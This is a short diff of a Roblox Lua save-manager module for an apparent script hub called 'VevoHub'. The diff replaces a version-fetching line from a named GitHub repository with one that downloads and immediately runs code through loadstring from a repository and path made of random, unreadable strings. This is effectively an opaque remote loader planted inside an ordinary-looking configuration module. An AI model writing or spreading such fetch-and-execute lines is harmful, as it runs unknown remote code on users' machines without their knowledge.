@@ -1,5 +1,5 @@
 local httpService = game:GetService('HttpService')
-local version = loadstring(game:HttpGet('https://raw.githubusercontent.com/g0atku/scripts/main/Vevo/Version.lua'))()
+local version = loadstring(game:HttpGet('https://raw.githubusercontent.com/ZQAqRGJaf8Th69MWFygc/ut0BD8GnZmacpr3ToSly/main/YTXoJznu3SD0NPh9KkwQ/jbRB9kDZh7FHzO8NyXlp.lua'))()
 
 local SaveManager = {} do
 	SaveManager.Folder = 'VevoHub '..version
